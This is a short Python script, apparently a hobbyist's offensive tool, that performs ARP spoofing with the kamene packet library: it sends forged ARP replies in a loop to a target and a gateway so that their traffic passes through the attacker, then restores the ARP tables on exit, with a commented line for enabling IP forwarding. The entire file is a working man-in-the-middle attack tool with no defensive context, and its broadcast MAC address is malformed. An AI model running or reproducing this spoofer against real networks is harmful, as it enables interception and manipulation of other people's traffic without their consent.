import kamene.all as scapy
import argparse
import time
import subprocess


class Arp_spoof():
    """"ARP spoofer"""

    def get_argument(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target", dest="target_ip", help="Target IP.")
        parser.add_argument("-s", "--source", dest="source_ip", help="Source IP.")
        options = parser.parse_args()
        if not options.target_ip:
            parser.error("[-] Please specify an target ip, use --help for more info")
        elif not options.source_ip:
            parser.error("[-] Please specify an source ip, use --help for more info")
        return options


    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        list_answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        mac_address = list_answered[0][1].hwsrc
        return mac_address


    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        paket = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(paket, verbose=False)

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        paket = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(paket, verbose=False, count=4)

    def started_spoofing(self):
        #subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward')
        sent_pakets_count = 0
        options = self.get_argument()
        try:
            while True:
                self.spoof(options.target_ip, options.source_ip)
                self.spoof(options.source_ip, options.target_ip)
                sent_pakets_count += 2
                print("\r[+] Pakets sent: " + str(sent_pakets_count), end="")
                time.sleep(2)
        except KeyboardInterrupt:
            print("[+] Detected CTRL + C ......Resetting ARP tables...Please wait.\n")
            self.restore(options.target_ip, options.source_ip)
            print("[+] ARP tables corrected !!!!")

if __name__=='__main__':
    arp_spoof = Arp_spoof()
    arp_spoof.started_spoofing()
